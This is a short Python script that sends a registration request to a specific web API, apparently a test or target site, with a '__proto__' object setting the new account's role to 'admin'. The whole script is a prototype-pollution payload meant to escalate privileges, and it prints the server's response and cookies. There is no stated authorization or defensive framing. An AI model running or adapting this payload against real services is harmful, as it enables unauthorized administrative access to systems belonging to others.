import requests

url = "https://deploylite.g24sec.space/api/auth/register"
headers = {"Content-Type": "application/json"}
data = {
    "email": "testadmin2@example.com",
    "username": "testadmin2",
    "password": "password123",
    "company": "testcompany",
    "__proto__": {
        "role": "admin"
    }
}

response = requests.post(url, headers=headers, json=data)
print(response.status_code)
print(response.text)
print(response.cookies)
